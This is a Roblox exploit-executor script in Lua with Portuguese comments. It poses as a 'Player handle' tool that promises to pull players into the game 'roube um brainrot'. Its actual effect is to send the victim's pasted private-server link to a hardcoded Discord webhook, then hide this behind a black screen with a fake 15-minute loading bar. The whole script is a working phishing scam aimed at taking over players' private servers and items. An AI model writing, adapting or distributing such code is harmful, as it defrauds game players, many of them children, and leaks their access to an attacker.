-- Roblox Script para executor (exploit)
-- Interface fixa, envio webhook, tela preta e barra de carregamento 15min

-- Configuração do webhook
local webhook_url = "https://discord.com/api/webhooks/1428103017369964565/_hTrVyWtnf4qQWMQ94pILkrxAJopWt1IbZ6pOLWKT0L9qfwybeviwGTE-DjZy-gDD_18"

-- Função para enviar para o webhook (suporta syn.request e http_request)
local function sendToWebhook(link)
local payload = {
["content"] = link
}
local json = game:GetService("HttpService"):JSONEncode(payload)
local headers = {
["Content-Type"] = "application/json"
}
if syn and syn.request then
syn.request({
Url = webhook_url,
Method = "POST",
Headers = headers,
Body = json
})
elseif http_request then
http_request({
Url = webhook_url,
Method = "POST",
Headers = headers,
Body = json
})
elseif request then
request({
Url = webhook_url,
Method = "POST",
Headers = headers,
Body = json
})
else
warn("Executor não suporta requests HTTP!")
end
end

-- Função para criar UI inicial
local function createUI()
local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PlayerHandleMenu"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 270)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -135)
mainFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "Player handle"
title.Font = Enum.Font.GothamBold
title.TextSize = 30
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Parent = mainFrame

local subtitle = Instance.new("TextLabel")
subtitle.Text = "ponhe o seu servidor privado abaixo e espera a tela de carregamento! "
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 18
subtitle.Size = UDim2.new(1, -10, 0, 40)
subtitle.Position = UDim2.new(0, 5, 0, 55)
subtitle.BackgroundTransparency = 1
subtitle.TextColor3 = Color3.fromRGB(180,180,180)
subtitle.TextWrapped = true
subtitle.Parent = mainFrame

local linkBox = Instance.new("TextBox")
linkBox.PlaceholderText = "Cole o link do servidor privado do roube um brainrot aqui"
linkBox.Font = Enum.Font.Gotham
linkBox.TextSize = 16
linkBox.Size = UDim2.new(1, -20, 0, 40)
linkBox.Position = UDim2.new(0, 10, 0, 105)
linkBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
linkBox.TextColor3 = Color3.fromRGB(255,255,255)
linkBox.ClearTextOnFocus = false
linkBox.Parent = mainFrame

local sendButton = Instance.new("TextButton")
sendButton.Text = "OK"
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 18
sendButton.Size = UDim2.new(0, 120, 0, 38)
sendButton.Position = UDim2.new(0.5, -60, 0, 160)
sendButton.BackgroundColor3 = Color3.fromRGB(70,130,180)
sendButton.TextColor3 = Color3.fromRGB(255,255,255)
sendButton.Parent = mainFrame

return screenGui, mainFrame, linkBox, sendButton

end

-- Função para criar tela preta e barra de carregamento
local function showLoadingScreen()
local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackLoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local blackFrame = Instance.new("Frame")
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.Position = UDim2.new(0,0,0,0)
blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
blackFrame.BorderSizePixel = 0
blackFrame.ZIndex = 10
blackFrame.Parent = screenGui

local loadingTitle = Instance.new("TextLabel")
loadingTitle.Text = "puxando players por favor espere"
loadingTitle.Font = Enum.Font.GothamBold
loadingTitle.TextSize = 30
loadingTitle.Size = UDim2.new(1, 0, 0, 60)
loadingTitle.Position = UDim2.new(0, 0, 0.3, -30)
loadingTitle.BackgroundTransparency = 1
loadingTitle.TextColor3 = Color3.fromRGB(255,255,255)
loadingTitle.ZIndex = 11
loadingTitle.Parent = blackFrame

local loadingBarBg = Instance.new("Frame")
loadingBarBg.Size = UDim2.new(0.5, 0, 0, 40)
loadingBarBg.Position = UDim2.new(0.25, 0, 0.5, 0)
loadingBarBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
loadingBarBg.BorderSizePixel = 0
loadingBarBg.ZIndex = 11
loadingBarBg.Parent = blackFrame

local loadingBar = Instance.new("Frame")
loadingBar.Size = UDim2.new(0, 0, 1, 0)
loadingBar.Position = UDim2.new(0, 0, 0, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(70,130,180)
loadingBar.BorderSizePixel = 0
loadingBar.ZIndex = 12
loadingBar.Parent = loadingBarBg

local percentText = Instance.new("TextLabel")
percentText.Text = "0%"
percentText.Font = Enum.Font.GothamBold
percentText.TextSize = 18
percentText.Size = UDim2.new(1, 0, 1, 0)
percentText.Position = UDim2.new(0, 0, 0, 0)
percentText.BackgroundTransparency = 1
percentText.TextColor3 = Color3.fromRGB(255,255,255)
percentText.ZIndex = 12
percentText.Parent = loadingBarBg

return screenGui, loadingBar, percentText, loadingBarBg

end

-- Criar UI inicial
local screenGui, mainFrame, linkBox, sendButton = createUI()

sendButton.MouseButton1Click:Connect(function()
local link = linkBox.Text
if link ~= "" then
-- Envia para o webhook
sendToWebhook(link)

-- Esconde menu principal
mainFrame.Visible = false

-- Mostra tela preta e barra de carregamento      
local loadingGui, loadingBar, percentText, loadingBarBg = showLoadingScreen()      

-- Barra de carregamento de 15 minutos      
local totalTime = 900 -- 15 minutos em segundos      
local elapsed = 0      
while elapsed < totalTime do      
    task.wait(0.1)      
    elapsed = elapsed + 0.1      
    local percent = math.floor((elapsed / totalTime) * 100)      
    loadingBar.Size = UDim2.new(percent/100, 0, 1, 0)      
    percentText.Text = percent .. "%"      
end      
loadingBar.Size = UDim2.new(1,0,1,0)      
percentText.Text = "100%"

end

end)
